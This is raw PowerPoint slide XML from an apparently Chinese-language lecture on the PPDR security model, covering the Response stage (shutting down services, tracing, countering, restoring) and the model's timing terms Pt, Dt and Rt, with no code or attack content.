        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="3709954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9874">
                                            <p:txEl>
                                              <p:pRg st="0" end="0"/>
                                            </p:txEl>
                                          </p:spTgt>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>style.visibility</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:to>
                                        <p:strVal val="visible"/>
                                      </p:to>
                                    </p:set>
                                    <p:anim calcmode="lin" valueType="num">
                                      <p:cBhvr additive="base">
                                        <p:cTn id="7" dur="500" fill="hold"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="7987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987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additive="base">
                                        <p:cTn id="32" dur="500" fill="hold"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="5"/>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>ppt_x</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:tavLst>
                                        <p:tav tm="0">
                                          <p:val>
                                            <p:strVal val="#ppt_x"/>
                                          </p:val>
                                        </p:tav>
                                        <p:tav tm="100000">
                                          <p:val>
                                            <p:strVal val="#ppt_x"/>
                                          </p:val>
                                        </p:tav>
                                      </p:tavLst>
                                    </p:anim>
                                    <p:anim calcmode="lin" valueType="num">
                                      <p:cBhvr additive="base">
                                        <p:cTn id="3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build="p"/>
      <p:bldP spid="2" grpId="0"/>
      <p:bldP spid="3" grpId="0"/>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noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="body" idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1042988" y="1233488"/>
            <a:ext cx="6421437" cy="884721"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:pPr>
              <a:lnSpc>
                <a:spcPct val="90000"/>
              </a:lnSpc>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="3200" b="1"/>
              <a:t>PPD</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="5400" b="1">
                <a:solidFill>
                  <a:srgbClr val="CC0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>R</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="3200" b="1" dirty="0"/>
              <a:t>： </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="3200" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="CC0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Response</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="3200" b="1" dirty="0"/>
              <a:t>反应</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:lnSpc>
                <a:spcPct val="90000"/>
              </a:lnSpc>
            </a:pPr>
            <a:endParaRPr lang="en-US" altLang="zh-CN" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="80899" name="标题 2"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1042988" y="746125"/>
            <a:ext cx="6513512" cy="487363"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>P</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>PDR</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>的理解</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US" dirty="0">
              <a:solidFill>
                <a:srgbClr val="FF0000"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="2" name="矩形 1"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="663340" y="3934764"/>
            <a:ext cx="7272808" cy="1421928"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="800100" lvl="1" indent="-342900">
              <a:lnSpc>
                <a:spcPct val="90000"/>
              </a:lnSpc>
              <a:buClr>
                <a:schemeClr val="tx2">
                  <a:lumMod val="60000"/>
                  <a:lumOff val="40000"/>
                </a:schemeClr>
              </a:buClr>
              <a:buFont typeface="Wingdings" panose="05000000000000000000" pitchFamily="2" charset="2"/>
              <a:buChar char="n"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2400" b="1" dirty="0">
                <a:latin typeface="仿宋_GB2312" pitchFamily="49" charset="-122"/>
              </a:rPr>
              <a:t>主要方法包括：</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="1200150" lvl="2" indent="-285750">
              <a:lnSpc>
                <a:spcPct val="90000"/>
              </a:lnSpc>
              <a:buClr>
                <a:srgbClr val="002060"/>
              </a:buClr>
              <a:buFont typeface="Wingdings" panose="05000000000000000000" pitchFamily="2" charset="2"/>
              <a:buChar char="u"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0033CC"/>
                </a:solidFill>
                <a:latin typeface="楷体_GB2312" pitchFamily="49" charset="-122"/>
              </a:rPr>
              <a:t>关闭服务</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="1200150" lvl="2" indent="-285750">
              <a:lnSpc>
                <a:spcPct val="90000"/>
              </a:lnSpc>
              <a:buClr>
                <a:srgbClr val="002060"/>
              </a:buClr>
              <a:buFont typeface="Wingdings" panose="05000000000000000000" pitchFamily="2" charset="2"/>
              <a:buChar char="u"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0033CC"/>
                </a:solidFill>
                <a:latin typeface="楷体_GB2312" pitchFamily="49" charset="-122"/>
              </a:rPr>
              <a:t>跟踪</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="1200150" lvl="2" indent="-285750">
              <a:lnSpc>
                <a:spcPct val="90000"/>
              </a:lnSpc>
              <a:buClr>
                <a:srgbClr val="002060"/>
              </a:buClr>
              <a:buFont typeface="Wingdings" panose="05000000000000000000" pitchFamily="2" charset="2"/>
              <a:buChar char="u"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0033CC"/>
                </a:solidFill>
                <a:latin typeface="楷体_GB2312" pitchFamily="49" charset="-122"/>
              </a:rPr>
              <a:t>反击</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="1200150" lvl="2" indent="-285750">
              <a:lnSpc>
                <a:spcPct val="90000"/>
              </a:lnSpc>
              <a:buClr>
                <a:srgbClr val="002060"/>
              </a:buClr>
              <a:buFont typeface="Wingdings" panose="05000000000000000000" pitchFamily="2" charset="2"/>
              <a:buChar char="u"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0033CC"/>
                </a:solidFill>
                <a:latin typeface="楷体_GB2312" pitchFamily="49" charset="-122"/>
              </a:rPr>
              <a:t>消除影响</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="矩形 2"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="598103" y="2118209"/>
            <a:ext cx="8023993" cy="757130"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="800100" lvl="1" indent="-342900">
              <a:lnSpc>
                <a:spcPct val="90000"/>
              </a:lnSpc>
              <a:buClr>
                <a:schemeClr val="tx2">
                  <a:lumMod val="60000"/>
                  <a:lumOff val="40000"/>
                </a:schemeClr>
              </a:buClr>
              <a:buFont typeface="Wingdings" panose="05000000000000000000" pitchFamily="2" charset="2"/>
              <a:buChar char="n"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2400" b="1" dirty="0">
                <a:latin typeface="仿宋_GB2312" pitchFamily="49" charset="-122"/>
              </a:rPr>
              <a:t>在检测到安全漏洞和安全事件时，通过及时的响应措施将网络系统的安全性调整到风险最低的状态</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2400" b="1" dirty="0"/>
              <a:t>。</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US" sz="2400" b="1" dirty="0">
              <a:latin typeface="仿宋_GB2312" pitchFamily="49" charset="-122"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="矩形 3"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="653306" y="3029646"/>
            <a:ext cx="7200800" cy="757130"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="800100" lvl="1" indent="-342900">
              <a:lnSpc>
                <a:spcPct val="90000"/>
              </a:lnSpc>
              <a:buClr>
                <a:schemeClr val="tx2">
                  <a:lumMod val="60000"/>
                  <a:lumOff val="40000"/>
                </a:schemeClr>
              </a:buClr>
              <a:buFont typeface="Wingdings" panose="05000000000000000000" pitchFamily="2" charset="2"/>
              <a:buChar char="n"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2400" b="1" dirty="0">
                <a:latin typeface="仿宋_GB2312" pitchFamily="49" charset="-122"/>
              </a:rPr>
              <a:t>评估系统受到的危害与损失，恢复系统功能和数据，启动备份系统等。</a:t>
            </a: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8144" y="3645024"/>
            <a:ext cx="2117237" cy="2540811"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="21228524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898">
                                            <p:txEl>
                                              <p:pRg st="0" end="0"/>
                                            </p:txEl>
                                          </p:spTgt>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>style.visibility</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:to>
                                        <p:strVal val="visible"/>
                                      </p:to>
                                    </p:set>
                                    <p:anim calcmode="lin" valueType="num">
                                      <p:cBhvr additive="base">
                                        <p:cTn id="7" dur="500" fill="hold"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="808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8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build="p"/>
      <p:bldP spid="2" grpId="0"/>
      <p:bldP spid="3" grpId="0"/>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934244" y="721703"/>
            <a:ext cx="6513512" cy="487363"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>PPDR</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>模型中的数学法则</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="7" name="Line 4"/>
          <p:cNvSpPr>
            <a:spLocks noChangeShapeType="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="862709" y="3602080"/>
            <a:ext cx="7696200" cy="0"/>
          </a:xfrm>
          <a:prstGeom prst="line">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln w="57150" cap="sq">
            <a:solidFill>
              <a:schemeClr val="tx1"/>
            </a:solidFill>
            <a:round/>
            <a:headEnd type="none" w="sm" len="sm"/>
            <a:tailEnd type="triangle" w="med" len="med"/>
          </a:ln>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="none" anchor="ctr"/>
          <a:lstStyle/>
          <a:p>
            <a:endParaRPr lang="zh-CN" altLang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="8" name="Text Box 5"/>
          <p:cNvSpPr txBox="1">
            <a:spLocks noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="7720709" y="2992480"/>
            <a:ext cx="793750" cy="457200"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln w="12700" cap="sq">
            <a:noFill/>
            <a:miter lim="800000"/>
            <a:headEnd type="none" w="sm" len="sm"/>
            <a:tailEnd type="none" w="sm" len="sm"/>
          </a:ln>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="none">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr kumimoji="1" lang="zh-CN" altLang="en-US" sz="2400" b="0">
                <a:latin typeface="Times New Roman" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>时间</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:graphicFrame>
        <p:nvGraphicFramePr>
          <p:cNvPr id="9" name="Object 6"/>
          <p:cNvGraphicFramePr>
            <a:graphicFrameLocks noChangeAspect="1"/>
          </p:cNvGraphicFramePr>
          <p:nvPr>
            <p:extLst>
              <p:ext uri="{D42A27DB-BD31-4B8C-83A1-F6EECF244321}">
                <p14:modId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="1823998247"/>
              </p:ext>
            </p:extLst>
          </p:nvPr>
        </p:nvGraphicFramePr>
        <p:xfrm>
          <a:off x="4977509" y="2535280"/>
          <a:ext cx="796925" cy="976313"/>
        </p:xfrm>
        <a:graphic>
          <a:graphicData uri="http://schemas.openxmlformats.org/presentationml/2006/ole">
            <mc:AlternateContent xmlns:mc="http://schemas.openxmlformats.org/markup-compatibility/2006">
              <mc:Choice xmlns:v="urn:schemas-microsoft-com:vml" Requires="v">
                <p:oleObj name="剪辑" r:id="rId5" imgW="3212280" imgH="3935520" progId="">
                  <p:embed/>
                </p:oleObj>
              </mc:Choice>
              <mc:Fallback>
                <p:oleObj name="剪辑" r:id="rId5" imgW="3212280" imgH="393552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77509" y="2535280"/>
                        <a:ext cx="796925"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 name="Group 7"/>
          <p:cNvGrpSpPr>
            <a:grpSpLocks/>
          </p:cNvGrpSpPr>
          <p:nvPr/>
        </p:nvGrpSpPr>
        <p:grpSpPr bwMode="auto">
          <a:xfrm>
            <a:off x="3758309" y="3754480"/>
            <a:ext cx="1828800" cy="914400"/>
            <a:chOff x="2352" y="2784"/>
            <a:chExt cx="1371" cy="696"/>
          </a:xfrm>
        </p:grpSpPr>
        <p:graphicFrame>
          <p:nvGraphicFramePr>
            <p:cNvPr id="11" name="Object 8"/>
            <p:cNvGraphicFramePr>
              <a:graphicFrameLocks noChangeAspect="1"/>
            </p:cNvGraphicFramePr>
            <p:nvPr/>
          </p:nvGraphicFramePr>
          <p:xfrm>
            <a:off x="2352" y="2784"/>
            <a:ext cx="864" cy="678"/>
          </p:xfrm>
          <a:graphic>
            <a:graphicData uri="http://schemas.openxmlformats.org/presentationml/2006/ole">
              <mc:AlternateContent xmlns:mc="http://schemas.openxmlformats.org/markup-compatibility/2006">
                <mc:Choice xmlns:v="urn:schemas-microsoft-com:vml" Requires="v">
                  <p:oleObj name="剪辑" r:id="rId7" imgW="971172" imgH="761703" progId="">
                    <p:embed/>
                  </p:oleObj>
                </mc:Choice>
                <mc:Fallback>
                  <p:oleObj name="剪辑" r:id="rId7" imgW="971172" imgH="761703"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2" y="2784"/>
                          <a:ext cx="864" cy="6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9"/>
            <p:cNvGraphicFramePr>
              <a:graphicFrameLocks noChangeAspect="1"/>
            </p:cNvGraphicFramePr>
            <p:nvPr/>
          </p:nvGraphicFramePr>
          <p:xfrm>
            <a:off x="3120" y="2832"/>
            <a:ext cx="603" cy="648"/>
          </p:xfrm>
          <a:graphic>
            <a:graphicData uri="http://schemas.openxmlformats.org/presentationml/2006/ole">
              <mc:AlternateContent xmlns:mc="http://schemas.openxmlformats.org/markup-compatibility/2006">
                <mc:Choice xmlns:v="urn:schemas-microsoft-com:vml" Requires="v">
                  <p:oleObj name="剪辑" r:id="rId9" imgW="885714" imgH="952129" progId="">
                    <p:embed/>
                  </p:oleObj>
                </mc:Choice>
                <mc:Fallback>
                  <p:oleObj name="剪辑" r:id="rId9" imgW="885714" imgH="952129"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0" y="2832"/>
                          <a:ext cx="603" cy="6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3" name="Object 10"/>
          <p:cNvGraphicFramePr>
            <a:graphicFrameLocks noChangeAspect="1"/>
          </p:cNvGraphicFramePr>
          <p:nvPr>
            <p:extLst>
              <p:ext uri="{D42A27DB-BD31-4B8C-83A1-F6EECF244321}">
                <p14:modId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="1669129731"/>
              </p:ext>
            </p:extLst>
          </p:nvPr>
        </p:nvGraphicFramePr>
        <p:xfrm>
          <a:off x="1777109" y="3754480"/>
          <a:ext cx="1066800" cy="809625"/>
        </p:xfrm>
        <a:graphic>
          <a:graphicData uri="http://schemas.openxmlformats.org/presentationml/2006/ole">
            <mc:AlternateContent xmlns:mc="http://schemas.openxmlformats.org/markup-compatibility/2006">
              <mc:Choice xmlns:v="urn:schemas-microsoft-com:vml" Requires="v">
                <p:oleObj name="剪辑" r:id="rId11" imgW="952129" imgH="723618" progId="">
                  <p:embed/>
                </p:oleObj>
              </mc:Choice>
              <mc:Fallback>
                <p:oleObj name="剪辑" r:id="rId11" imgW="952129" imgH="723618"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77109" y="3754480"/>
                        <a:ext cx="1066800"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1"/>
          <p:cNvGraphicFramePr>
            <a:graphicFrameLocks noChangeAspect="1"/>
          </p:cNvGraphicFramePr>
          <p:nvPr>
            <p:extLst>
              <p:ext uri="{D42A27DB-BD31-4B8C-83A1-F6EECF244321}">
                <p14:modId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="2416157977"/>
              </p:ext>
            </p:extLst>
          </p:nvPr>
        </p:nvGraphicFramePr>
        <p:xfrm>
          <a:off x="6806309" y="2763880"/>
          <a:ext cx="639763" cy="733425"/>
        </p:xfrm>
        <a:graphic>
          <a:graphicData uri="http://schemas.openxmlformats.org/presentationml/2006/ole">
            <mc:AlternateContent xmlns:mc="http://schemas.openxmlformats.org/markup-compatibility/2006">
              <mc:Choice xmlns:v="urn:schemas-microsoft-com:vml" Requires="v">
                <p:oleObj name="剪辑" r:id="rId13" imgW="838095" imgH="961905" progId="">
                  <p:embed/>
                </p:oleObj>
              </mc:Choice>
              <mc:Fallback>
                <p:oleObj name="剪辑" r:id="rId13" imgW="838095" imgH="961905"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06309" y="2763880"/>
                        <a:ext cx="639763"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 name="Group 12"/>
          <p:cNvGrpSpPr>
            <a:grpSpLocks/>
          </p:cNvGrpSpPr>
          <p:nvPr/>
        </p:nvGrpSpPr>
        <p:grpSpPr bwMode="auto">
          <a:xfrm>
            <a:off x="1319909" y="2535280"/>
            <a:ext cx="5562600" cy="1047750"/>
            <a:chOff x="816" y="1728"/>
            <a:chExt cx="3658" cy="948"/>
          </a:xfrm>
        </p:grpSpPr>
        <p:graphicFrame>
          <p:nvGraphicFramePr>
            <p:cNvPr id="16" name="Object 13"/>
            <p:cNvGraphicFramePr>
              <a:graphicFrameLocks noChangeAspect="1"/>
            </p:cNvGraphicFramePr>
            <p:nvPr/>
          </p:nvGraphicFramePr>
          <p:xfrm>
            <a:off x="816" y="1728"/>
            <a:ext cx="634" cy="948"/>
          </p:xfrm>
          <a:graphic>
            <a:graphicData uri="http://schemas.openxmlformats.org/presentationml/2006/ole">
              <mc:AlternateContent xmlns:mc="http://schemas.openxmlformats.org/markup-compatibility/2006">
                <mc:Choice xmlns:v="urn:schemas-microsoft-com:vml" Requires="v">
                  <p:oleObj name="剪辑" r:id="rId15" imgW="3031560" imgH="4533480" progId="">
                    <p:embed/>
                  </p:oleObj>
                </mc:Choice>
                <mc:Fallback>
                  <p:oleObj name="剪辑" r:id="rId15" imgW="3031560" imgH="4533480" progId="">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16" y="1728"/>
                          <a:ext cx="634" cy="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4"/>
            <p:cNvGraphicFramePr>
              <a:graphicFrameLocks noChangeAspect="1"/>
            </p:cNvGraphicFramePr>
            <p:nvPr/>
          </p:nvGraphicFramePr>
          <p:xfrm>
            <a:off x="1728" y="1728"/>
            <a:ext cx="634" cy="948"/>
          </p:xfrm>
          <a:graphic>
            <a:graphicData uri="http://schemas.openxmlformats.org/presentationml/2006/ole">
              <mc:AlternateContent xmlns:mc="http://schemas.openxmlformats.org/markup-compatibility/2006">
                <mc:Choice xmlns:v="urn:schemas-microsoft-com:vml" Requires="v">
                  <p:oleObj name="剪辑" r:id="rId15" imgW="3031560" imgH="4533480" progId="">
                    <p:embed/>
                  </p:oleObj>
                </mc:Choice>
                <mc:Fallback>
                  <p:oleObj name="剪辑" r:id="rId15" imgW="3031560" imgH="4533480" progId="">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28" y="1728"/>
                          <a:ext cx="634" cy="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5"/>
            <p:cNvGraphicFramePr>
              <a:graphicFrameLocks noChangeAspect="1"/>
            </p:cNvGraphicFramePr>
            <p:nvPr/>
          </p:nvGraphicFramePr>
          <p:xfrm>
            <a:off x="2400" y="1728"/>
            <a:ext cx="634" cy="948"/>
          </p:xfrm>
          <a:graphic>
            <a:graphicData uri="http://schemas.openxmlformats.org/presentationml/2006/ole">
              <mc:AlternateContent xmlns:mc="http://schemas.openxmlformats.org/markup-compatibility/2006">
                <mc:Choice xmlns:v="urn:schemas-microsoft-com:vml" Requires="v">
                  <p:oleObj name="剪辑" r:id="rId15" imgW="3031560" imgH="4533480" progId="">
                    <p:embed/>
                  </p:oleObj>
                </mc:Choice>
                <mc:Fallback>
                  <p:oleObj name="剪辑" r:id="rId15" imgW="3031560" imgH="4533480" progId="">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00" y="1728"/>
                          <a:ext cx="634" cy="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6"/>
            <p:cNvGraphicFramePr>
              <a:graphicFrameLocks noChangeAspect="1"/>
            </p:cNvGraphicFramePr>
            <p:nvPr/>
          </p:nvGraphicFramePr>
          <p:xfrm>
            <a:off x="3840" y="1728"/>
            <a:ext cx="634" cy="948"/>
          </p:xfrm>
          <a:graphic>
            <a:graphicData uri="http://schemas.openxmlformats.org/presentationml/2006/ole">
              <mc:AlternateContent xmlns:mc="http://schemas.openxmlformats.org/markup-compatibility/2006">
                <mc:Choice xmlns:v="urn:schemas-microsoft-com:vml" Requires="v">
                  <p:oleObj name="剪辑" r:id="rId15" imgW="3031560" imgH="4533480" progId="">
                    <p:embed/>
                  </p:oleObj>
                </mc:Choice>
                <mc:Fallback>
                  <p:oleObj name="剪辑" r:id="rId15" imgW="3031560" imgH="4533480" progId="">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40" y="1728"/>
                          <a:ext cx="634" cy="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0" name="Line 17"/>
          <p:cNvSpPr>
            <a:spLocks noChangeShapeType="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="862709" y="2992480"/>
            <a:ext cx="0" cy="1219200"/>
          </a:xfrm>
          <a:prstGeom prst="line">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln w="57150" cap="sq">
            <a:solidFill>
              <a:schemeClr val="tx1"/>
            </a:solidFill>
            <a:round/>
            <a:headEnd type="none" w="sm" len="sm"/>
            <a:tailEnd type="none" w="sm" len="sm"/>
          </a:ln>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="none" anchor="ctr"/>
          <a:lstStyle/>
          <a:p>
            <a:endParaRPr lang="zh-CN" altLang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:grpSp>
        <p:nvGrpSpPr>
          <p:cNvPr id="21" name="Group 18"/>
          <p:cNvGrpSpPr>
            <a:grpSpLocks/>
          </p:cNvGrpSpPr>
          <p:nvPr/>
        </p:nvGrpSpPr>
        <p:grpSpPr bwMode="auto">
          <a:xfrm>
            <a:off x="938909" y="1697080"/>
            <a:ext cx="6096000" cy="3613150"/>
            <a:chOff x="576" y="1152"/>
            <a:chExt cx="3840" cy="2276"/>
          </a:xfrm>
        </p:grpSpPr>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="22" name="Text Box 19"/>
            <p:cNvSpPr txBox="1">
              <a:spLocks noChangeArrowheads="1"/>
            </p:cNvSpPr>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr bwMode="auto">
            <a:xfrm>
              <a:off x="2256" y="1152"/>
              <a:ext cx="383" cy="442"/>
            </a:xfrm>
            <a:prstGeom prst="rect">
              <a:avLst/>
            </a:prstGeom>
            <a:noFill/>
            <a:ln w="12700" cap="sq">
              <a:noFill/>
              <a:miter lim="800000"/>
              <a:headEnd type="none" w="sm" len="sm"/>
              <a:tailEnd type="none" w="sm" len="sm"/>
            </a:ln>
          </p:spPr>
          <p:txBody>
            <a:bodyPr wrap="none">
              <a:spAutoFit/>
            </a:bodyPr>
            <a:lstStyle/>
            <a:p>
              <a:pPr algn="l"/>
              <a:r>
                <a:rPr kumimoji="1" lang="en-US" altLang="zh-CN" sz="4000" b="0">
                  <a:latin typeface="Times New Roman" pitchFamily="18" charset="0"/>
                </a:rPr>
                <a:t>Pt</a:t>
              </a:r>
            </a:p>
          </p:txBody>
        </p:sp>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="23" name="Text Box 20"/>
            <p:cNvSpPr txBox="1">
              <a:spLocks noChangeArrowheads="1"/>
            </p:cNvSpPr>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr bwMode="auto">
            <a:xfrm>
              <a:off x="1152" y="3004"/>
              <a:ext cx="404" cy="404"/>
            </a:xfrm>
            <a:prstGeom prst="rect">
              <a:avLst/>
            </a:prstGeom>
            <a:noFill/>
            <a:ln w="12700" cap="sq">
              <a:noFill/>
              <a:miter lim="800000"/>
              <a:headEnd type="none" w="sm" len="sm"/>
              <a:tailEnd type="none" w="sm" len="sm"/>
            </a:ln>
          </p:spPr>
          <p:txBody>
            <a:bodyPr wrap="none">
              <a:spAutoFit/>
            </a:bodyPr>
            <a:lstStyle/>
            <a:p>
              <a:pPr algn="l"/>
              <a:r>
                <a:rPr kumimoji="1" lang="en-US" altLang="zh-CN" sz="3600" b="0">
                  <a:latin typeface="Times New Roman" pitchFamily="18" charset="0"/>
                </a:rPr>
                <a:t>Dt</a:t>
              </a:r>
            </a:p>
          </p:txBody>
        </p:sp>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="24" name="Text Box 21"/>
            <p:cNvSpPr txBox="1">
              <a:spLocks noChangeArrowheads="1"/>
            </p:cNvSpPr>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr bwMode="auto">
            <a:xfrm>
              <a:off x="2640" y="3024"/>
              <a:ext cx="388" cy="404"/>
            </a:xfrm>
            <a:prstGeom prst="rect">
              <a:avLst/>
            </a:prstGeom>
            <a:noFill/>
            <a:ln w="12700" cap="sq">
              <a:noFill/>
              <a:miter lim="800000"/>
              <a:headEnd type="none" w="sm" len="sm"/>
              <a:tailEnd type="none" w="sm" len="sm"/>
            </a:ln>
          </p:spPr>
          <p:txBody>
            <a:bodyPr wrap="none">
              <a:spAutoFit/>
            </a:bodyPr>
            <a:lstStyle/>
            <a:p>
              <a:pPr algn="l"/>
              <a:r>
                <a:rPr kumimoji="1" lang="en-US" altLang="zh-CN" sz="3600" b="0">
                  <a:latin typeface="Times New Roman" pitchFamily="18" charset="0"/>
                </a:rPr>
                <a:t>Rt</a:t>
              </a:r>
            </a:p>
          </p:txBody>
        </p:sp>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="25" name="Line 22"/>
            <p:cNvSpPr>
